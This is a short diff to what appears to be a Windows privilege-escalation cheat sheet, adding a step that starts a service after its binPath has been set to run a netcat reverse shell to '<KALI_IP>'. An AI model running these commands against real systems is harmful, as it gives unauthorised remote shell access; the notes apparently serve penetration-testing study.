@@ -229,6 +229,12 @@ Use accesschk64 (https://learn.microsoft.com/en-us/sysinternals/downloads/access
 sc config <service_name> binPath="nc.exe <KALI_IP> <PORT> -e C:\Windows\system32\cmd.exe"
 ```
 
+### Start the service
+
+```
+net start <daclsvc_service_name>
+```
+
 ---
 
 # 9. Scheduled Tasks
